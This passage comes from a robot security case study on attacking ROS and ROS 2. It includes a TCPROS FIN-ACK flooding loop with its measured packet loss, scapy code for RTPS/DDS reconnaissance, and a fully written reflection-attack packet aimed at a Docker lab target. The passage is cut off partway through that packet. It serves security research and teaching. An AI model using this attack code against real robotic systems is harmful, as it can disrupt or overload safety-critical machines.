    <span id="cb15-42"><a href="#cb15-42" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="va">True</span>:</span>
    <span id="cb15-43"><a href="#cb15-43" aria-hidden="true" tabindex="-1"></a>    tcpros_fin_ack()</span></code></pre></div>
    <p>The following figure shows the result of the <code>FIN-ACK</code> attack on a targeted machine. Image displays a significant reduction of the reception rate and down to more than half (4.940 Hz) from the designated 10 Hz of transmission. The information sent from the publisher consists of an iterative integer number however the data received in the target <em>under attack</em> shows significant integer jumps, which confirm the package losses. More elaborated attacks could be built upon using a time-sensitive approach. A time-sensitive approach could lead to more elaborated attacks.</p>
    <p><img src="../../images/2021/fin_ack_attack.png" /></p>
    <h2 id="robot-operating-system-ros-2">Robot Operating System (ROS) 2</h2>
    <p>The Robot Operating System (ROS) is the de <em>facto</em> standard for robot application development <span class="citation" data-cites="Quigley09">(<a href="#ref-Quigley09" role="doc-biblioref">Quigley, Gerkey, et al. 2009</a>)</span>. It’s a framework for creating robot behaviors that comprises various stacks and capabilities for message passing, perception, navigation, manipulation or security, among others. It’s <a href="https://www.businesswire.com/news/home/20190516005135/en/Rise-ROS-55-total-commercial-robots-shipped">estimated</a> that by 2024, 55% of the total commercial robots will be shipping at least one ROS package. <strong>ROS is to roboticists what Linux is to computer scientists</strong>.</p>
    <p>This case study will analyze the security of ROS 2<span class="sidenote-wrapper"><label for="sn-18" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-18" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> and demonstrate how flaws on both ROS 2 or its underlayers lead to the system being compromised.</p>
    <h3 id="dissecting-ros-2-network-interactions-through-rtps">Dissecting ROS 2 network interactions through RTPS</h3>
    <p>To hack ROS 2, we’ll be using a network dissector of the underlying default communication middleware that ROS 2 uses: DDS. DDS stands for Data Distribution Service and is a middleware technology used in critical applications like autonomous driving, industrial and consumer robotics, healthcare machinery or military tactical systems, among others.</p>
    <p>In collaboration with other researchers, we built a DDS (more specifically, a Real-Time Publish Subscribe (RTPS) protocol) dissector to tinker with the ROS 2 communications. For a stable (known to work for the PoCs presented below) branch of the dissector, refer to <a href="https://github.com/vmayoral/scapy/tree/rtps">https://github.com/vmayoral/scapy/tree/rtps</a> or alternatively, refer to the <a href="https://github.com/secdev/scapy/pull/3403">official Pull Request we sent to scapy</a> for upstream integration.</p>
    <p>The package dissector allows to both dissect and craft, which will be helpful while checking the resilience of ROS 2 communications. E.g., the following Python piece shows how to craft a simple empty RTPS package that will interoperate with ROS 2 Nodes:</p>
    <p><img src="../../images/2021/rtps_simple.png" /></p>
    <figure>
    <embed src="images/2021/rtps_simple.pdf" /><figcaption aria-hidden="true">A simple empty RTPS package</figcaption>
    </figure>
    <div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>rtps_package <span class="op">=</span> RTPS(</span>
    <span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    protocolVersion<span class="op">=</span>ProtocolVersionPacket(major<span class="op">=</span><span class="dv">2</span>, minor<span class="op">=</span><span class="dv">4</span>),</span>
    <span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    vendorId<span class="op">=</span>VendorIdPacket(vendor_id<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x01\x03</span><span class="st">&quot;</span>),</span>
    <span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    guidPrefix<span class="op">=</span>GUIDPrefixPacket(</span>
    <span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>        hostId<span class="op">=</span><span class="dv">16974402</span>, appId<span class="op">=</span><span class="dv">2886795266</span>, instanceId<span class="op">=</span><span class="dv">1172693757</span></span>
    <span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    ),</span>
    <span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    magic<span class="op">=</span><span class="st">b&quot;RTPS&quot;</span>,</span>
    <span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>)</span></code></pre></div>
    <p>Let’s get started by dockerizing an arbitrary targeted ROS 2 system.</p>
    <h3 id="dockerizing-the-target-environment">Dockerizing the target environment</h3>
    <p>ROS 2 is nicely integrated with Docker, which simplifies creating a hacking development environment. Let’s build on top of the default ROS 2 containers and produce two targets for the latest LTS ROS 2 release: ROS 2 Foxy (latest LTS)</p>
    <h4 id="build-for-foxy-from-source-and-run">Build for Foxy from source and run</h4>
    <div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Build may take a while depending on your machine specs</span></span>
    <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> hacking_ros2:foxy <span class="at">--build-arg</span> DISTRO=foxy .</span></code></pre></div>
    <h4 id="run-headless">Run headless</h4>
    <div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Launch container</span></span>
    <span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> hacking_ros2:foxy /bin/bash</span>
    <span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Now test the dissector</span></span>
    <span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;&lt; EOF</span> <span class="op">&gt;</span> /tmp/rtps_test.py</span>
    <span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="st">from scapy.all import *</span></span>
    <span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="st">from scapy.layers.inet import UDP, IP</span></span>
    <span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="st">from scapy.contrib.rtps import *</span></span>
    <span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a><span class="st">bind_layers(UDP, RTPS)</span></span>
    <span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="st">conf.verb = 0</span></span>
    <span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="st">rtps_package = RTPS(</span></span>
    <span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a><span class="st">    protocolVersion=ProtocolVersionPacket(major=2, minor=4),</span></span>
    <span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="st">    vendorId=VendorIdPacket(vendor_id=b&quot;</span><span class="dt">\x</span><span class="st">01</span><span class="dt">\x</span><span class="st">03&quot;),</span></span>
    <span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="st">    guidPrefix=GUIDPrefixPacket(</span></span>
    <span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="st">        hostId=16974402, appId=2886795266, instanceId=1172693757</span></span>
    <span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="st">    ),</span></span>
    <span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="st">    magic=b&quot;RTPS&quot;,</span></span>
    <span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="st">)</span></span>
    <span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a><span class="st">hexdump(rtps_package)</span></span>
    <span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a><span class="st">rtps_package.show()</span></span>
    <span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
    <span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> /tmp/rtps_test.py</span>
    <span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0000</span>  52 54 50 53 02 04 01 03 01 03 02 42 AC 11 00 02  RTPS.......B....</span>
    <span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0010</span>  45 E5 E2 FD                                      E...</span>
    <span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a><span class="co">###[ RTPS Header ]</span><span class="al">###</span></span>
    <span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a>  <span class="ex">magic</span>     = <span class="st">&#39;RTPS&#39;</span></span>
    <span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>  <span class="ex">\protocolVersion</span><span class="dt">\</span></span>
    <span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span><span class="co">###[ RTPS Protocol Version ]</span><span class="al">###</span></span>
    <span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="ex">major</span>     = 2</span>
    <span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="ex">minor</span>     = 4</span>
    <span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a>  <span class="ex">\vendorId</span>  <span class="dt">\</span></span>
    <span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span><span class="co">###[ RTPS Vendor ID ]</span><span class="al">###</span></span>
    <span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="ex">vendor_id</span> = Object Computing Incorporated, Inc. <span class="er">(</span><span class="ex">OCI</span><span class="kw">)</span> <span class="ex">-</span> OpenDDS</span>
    <span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a>  <span class="ex">\guidPrefix</span><span class="dt">\</span></span>
    <span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span><span class="co">###[ RTPS GUID Prefix ]</span><span class="al">###</span></span>
    <span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="ex">hostId</span>    = 0x1030242</span>
    <span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="ex">appId</span>     = 0xac110002</span>
    <span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a>   <span class="kw">|</span>  <span class="va">instanceId</span><span class="op">=</span> <span class="ex">0x45e5e2fd</span></span></code></pre></div>
    <h4 id="run-using-x11">Run, using X11</h4>
    <div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">xhost</span> + <span class="co"># (careful with this! use your IP instead if possible)</span></span>
    <span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> <span class="at">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="at">-e</span> DISPLAY=<span class="va">$DISPLAY</span> <span class="at">-v</span> <span class="va">$HOME</span>/.Xauthority:/home/xilinx/.Xauthority hacking_ros2:foxy</span></code></pre></div>
    <h3 id="ros-2-reconnaissance">ROS 2 reconnaissance</h3>
    <p>ROS 2 uses DDS as the default communication middleware. To locate ROS 2 computational Nodes, one can rely on DDS discovery mechanisms. Here’s the body of an arbitrary discovery response obtained from one of the most popular DDS implementations: Cyclone DDS.</p>
    <pre><code>0000  52 54 50 53 02 01 01 10 01 10 5C 8E 2C D4 58 47  RTPS......\.,.XG
    0010  FA 5A 30 D3 09 01 08 00 6E 91 76 61 09 C4 5C E5  .Z0.....n.va..\.
    0020  15 05 F8 00 00 00 10 00 00 00 00 00 00 01 00 C2  ................
    0030  00 00 00 00 01 00 00 00 00 03 00 00 2C 00 1C 00  ............,...
    0040  17 00 00 00 44 44 53 50 65 72 66 3A 30 3A 35 38  ....DDSPerf:0:58
    0050  3A 74 65 73 74 2E 6C 6F 63 61 6C 00 15 00 04 00  :test.local.....
    0060  02 01 00 00 16 00 04 00 01 10 00 00 02 00 08 00  ................
    0070  00 00 00 00 38 89 41 00 50 00 10 00 01 10 5C 8E  ....8.A.P.....\.
    0080  2C D4 58 47 FA 5A 30 D3 00 00 01 C1 58 00 04 00  ,.XG.Z0.....X...
    0090  00 00 00 00 0F 00 04 00 00 00 00 00 31 00 18 00  ............1...
    00a0  01 00 00 00 6A 7A 00 00 00 00 00 00 00 00 00 00  ....jz..........
    00b0  00 00 00 00 C0 A8 01 55 32 00 18 00 01 00 00 00  .......U2.......
    00c0  6A 7A 00 00 00 00 00 00 00 00 00 00 00 00 00 00  jz..............
    00d0  C0 A8 01 55 07 80 38 00 00 00 00 00 2C 00 00 00  ...U..8.....,...
    00e0  00 00 00 00 00 00 00 00 00 00 00 00 1D 00 00 00  ................
    00f0  74 65 73 74 2E 6C 6F 63 61 6C 2F 30 2E 39 2E 30  test.local/0.9.0
    0100  2F 4C 69 6E 75 78 2F 4C 69 6E 75 78 00 00 00 00  /Linux/Linux....
    0110  19 80 04 00 00 80 06 00 01 00 00 00              ............</code></pre>
    <p>Using the RTPS dissector, we’re can craft discovery requests and send them to targeted machines, processing the response and determining if any DDS participant is active within that machine and DOMAIN_ID.</p>
    <p>Let’s craft a package as follows and send it to the dockerized target we built before:</p>
    <p><img src="../../images/2021/footprinting.png" /></p>
    <figure>
    <embed src="images/2021/footprinting.pdf" /><figcaption aria-hidden="true">A simple empty RTPS package</figcaption>
    </figure>
    <div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 1 - ROS 2 Node</span></span>
    <span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> <span class="at">--net</span><span class="op">=</span>host hacking_ros2:foxy <span class="at">-c</span> <span class="st">&quot;source /opt/opendds_ws/install/setup.bash; RMW_IMPLEMENTATION=rmw_cyclonedds_cpp /opt/opendds_ws/install/lib/examples_rclcpp_minimal_publisher/publisher_lambda&quot;</span></span>
    <span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="co">## terminal 2 - Attacker (reconnaissance)</span></span>
    <span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> exploits/footprint.py <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
    <p>Though DDS implementations comply with <a href="https://www.omg.org/spec/DDS">OMG’s DDS’s specification</a>, discovery responses vary among implementations. The following recording shows how while the crafted package allows to determine the presence of ROS 2 Nodes running (Galactic-default) CycloneDDS implementation, when changed to Fast-DDS (another DDS implementation, previously called FastRTPS and the default one in Foxy), no responses to the discovery message are received.</p>
    <p><a href="https://asciinema.org/a/K1IBM7ojOKlw89XhP9FJUXGYV"><img src="https://asciinema.org/a/K1IBM7ojOKlw89XhP9FJUXGYV.svg" alt="ROS 2 reconnaissance PoC" /></a></p>
    <h3 id="ros-2-reflection-attack">ROS 2 reflection attack</h3>
    <p><a href="https://asciinema.org/a/450475"><img src="https://asciinema.org/a/450475.svg" alt="ROS 2 reflection attack" /></a></p>
    <p>Each RTPS package <code>RTPSSubMessage_DATA</code> submessage can have multiple parameters. One of such parameters is <code>PID_METATRAFFIC_MULTICAST_LOCATOR</code>. Defined on <a href="https://www.omg.org/spec/DDSI-RTPS/2.5/PDF">OMG’s RTPS spec</a>, it allows to hint which address should be used for multicast interactions. Unfortunately, there’s no whitelisting of which IPs are to be included in here and all implementations allow for arbitrary IPs in this field. By modifying this value through a package, an attacker could hint a ROS 2 Node (through its underlying DDS implementation) to use a new multicast IP address (e.g. a malicious server that generates continuous traffic and responses to overload the stack and generate unwanted traffic) which can be used to trigger reflection (or amplification) attacks.</p>
    <p><img src="../../images/2021/ros2_reflection.png" /></p>
    <figure>
    <embed src="images/2021/ros2_reflection.pdf" /><figcaption aria-hidden="true">An RTPS package that triggers a reflection attack</figcaption>
    </figure>
    <p>Here’s an example of such package crafted with our dissector:</p>
    <div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.layers.inet <span class="im">import</span> UDP, IP</span>
    <span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.contrib.rtps <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>bind_layers(UDP, RTPS)</span>
    <span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>conf.verb <span class="op">=</span> <span class="dv">0</span></span>
    <span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>dst <span class="op">=</span> <span class="st">&quot;172.17.0.2&quot;</span></span>
    <span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>sport <span class="op">=</span> <span class="dv">17900</span></span>
    <span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>dport <span class="op">=</span> <span class="dv">7400</span></span>
    <span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a>package <span class="op">=</span> (</span>
    <span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a>    IP(</span>
    <span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a>        version<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a>        ihl<span class="op">=</span><span class="dv">5</span>,</span>
    <span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a>        tos<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a>        <span class="bu">len</span><span class="op">=</span><span class="dv">288</span>,</span>
    <span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a>        <span class="bu">id</span><span class="op">=</span><span class="dv">41057</span>,</span>
    <span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a>        flags<span class="op">=</span><span class="dv">2</span>,</span>
    <span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a>        frag<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a>        dst<span class="op">=</span>dst,</span>
    <span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> UDP(sport<span class="op">=</span><span class="dv">45892</span>, dport<span class="op">=</span>dport, <span class="bu">len</span><span class="op">=</span><span class="dv">268</span>)</span>
    <span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> RTPS(</span>
    <span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a>        protocolVersion<span class="op">=</span>ProtocolVersionPacket(major<span class="op">=</span><span class="dv">2</span>, minor<span class="op">=</span><span class="dv">4</span>),</span>
    <span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a>        vendorId<span class="op">=</span>VendorIdPacket(vendor_id<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x01\x03</span><span class="st">&quot;</span>),</span>
    <span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a>        guidPrefix<span class="op">=</span>GUIDPrefixPacket(</span>
    <span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a>            hostId<span class="op">=</span><span class="dv">16974402</span>, appId<span class="op">=</span><span class="dv">2886795267</span>, instanceId<span class="op">=</span><span class="dv">10045242</span></span>
    <span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a>        ),</span>
    <span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a>        magic<span class="op">=</span><span class="st">b&quot;RTPS&quot;</span>,</span>
    <span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> RTPSMessage(</span>
    <span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a>        submessages<span class="op">=</span>[</span>
    <span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a>            RTPSSubMessage_DATA(</span>
    <span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a>                submessageId<span class="op">=</span><span class="dv">21</span>,</span>
    <span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a>                submessageFlags<span class="op">=</span><span class="dv">5</span>,</span>
    <span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a>                octetsToNextHeader<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a>                extraFlags<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a>                octetsToInlineQoS<span class="op">=</span><span class="dv">16</span>,</span>
    <span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a>                readerEntityIdKey<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a>                readerEntityIdKind<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a>                writerEntityIdKey<span class="op">=</span><span class="dv">256</span>,</span>
    <span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a>                writerEntityIdKind<span class="op">=</span><span class="dv">194</span>,</span>
    <span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a>                writerSeqNumHi<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a>                writerSeqNumLow<span class="op">=</span><span class="dv">1</span>,</span>
    <span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a>                data<span class="op">=</span>DataPacket(</span>
    <span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a>                    encapsulationKind<span class="op">=</span><span class="dv">3</span>,</span>
    <span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a>                    encapsulationOptions<span class="op">=</span><span class="dv">0</span>,</span>
    <span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a>                    parameterList<span class="op">=</span>ParameterListPacket(</span>
    <span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a>                        parameterValues<span class="op">=</span>[</span>
    <span id="cb22-51"><a href="#cb22-51" aria-hidden="true" tabindex="-1"></a>                            PID_BUILTIN_ENDPOINT_QOS(</span>
    <span id="cb22-52"><a href="#cb22-52" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">119</span>,</span>
    <span id="cb22-53"><a href="#cb22-53" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-54"><a href="#cb22-54" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-55"><a href="#cb22-55" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-56"><a href="#cb22-56" aria-hidden="true" tabindex="-1"></a>                            PID_DOMAIN_ID(</span>
    <span id="cb22-57"><a href="#cb22-57" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">15</span>,</span>
    <span id="cb22-58"><a href="#cb22-58" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-59"><a href="#cb22-59" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;*</span><span class="ch">\x00\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-60"><a href="#cb22-60" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-61"><a href="#cb22-61" aria-hidden="true" tabindex="-1"></a>                            PID_PROTOCOL_VERSION(</span>
    <span id="cb22-62"><a href="#cb22-62" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">21</span>,</span>
    <span id="cb22-63"><a href="#cb22-63" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-64"><a href="#cb22-64" aria-hidden="true" tabindex="-1"></a>                                protocolVersion<span class="op">=</span>ProtocolVersionPacket(major<span class="op">=</span><span class="dv">2</span>, minor<span class="op">=</span><span class="dv">4</span>),</span>
    <span id="cb22-65"><a href="#cb22-65" aria-hidden="true" tabindex="-1"></a>                                padding<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-66"><a href="#cb22-66" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-67"><a href="#cb22-67" aria-hidden="true" tabindex="-1"></a>                            PID_PARTICIPANT_GUID(</span>
    <span id="cb22-68"><a href="#cb22-68" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">80</span>,</span>
    <span id="cb22-69"><a href="#cb22-69" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">16</span>,</span>
    <span id="cb22-70"><a href="#cb22-70" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x01\x03\x02</span><span class="st">B</span><span class="ch">\xac\x11\x00\x03\x00\x99</span><span class="st">G:</span><span class="ch">\x00\x00\x01\xc1</span><span class="st">&quot;</span>,</span>
    <span id="cb22-71"><a href="#cb22-71" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-72"><a href="#cb22-72" aria-hidden="true" tabindex="-1"></a>                            PID_VENDOR_ID(</span>
    <span id="cb22-73"><a href="#cb22-73" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">22</span>,</span>
    <span id="cb22-74"><a href="#cb22-74" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-75"><a href="#cb22-75" aria-hidden="true" tabindex="-1"></a>                                vendorId<span class="op">=</span>VendorIdPacket(vendor_id<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x01\x03</span><span class="st">&quot;</span>),</span>
    <span id="cb22-76"><a href="#cb22-76" aria-hidden="true" tabindex="-1"></a>                                padding<span class="op">=</span><span class="st">b&quot;</span><span class="ch">\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-77"><a href="#cb22-77" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-78"><a href="#cb22-78" aria-hidden="true" tabindex="-1"></a>                            PID_PARTICIPANT_BUILTIN_ENDPOINTS(</span>
    <span id="cb22-79"><a href="#cb22-79" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">68</span>,</span>
    <span id="cb22-80"><a href="#cb22-80" aria-hidden="true" tabindex="-1"></a>                                parameterLength<span class="op">=</span><span class="dv">4</span>,</span>
    <span id="cb22-81"><a href="#cb22-81" aria-hidden="true" tabindex="-1"></a>                                parameterData<span class="op">=</span><span class="st">b&quot;?</span><span class="ch">\xfc\x00\x00</span><span class="st">&quot;</span>,</span>
    <span id="cb22-82"><a href="#cb22-82" aria-hidden="true" tabindex="-1"></a>                            ),</span>
    <span id="cb22-83"><a href="#cb22-83" aria-hidden="true" tabindex="-1"></a>                            PID_BUILTIN_ENDPOINT_SET(</span>
    <span id="cb22-84"><a href="#cb22-84" aria-hidden="true" tabindex="-1"></a>                                parameterId<span class="op">=</span><span class="dv">88</span>,</span>
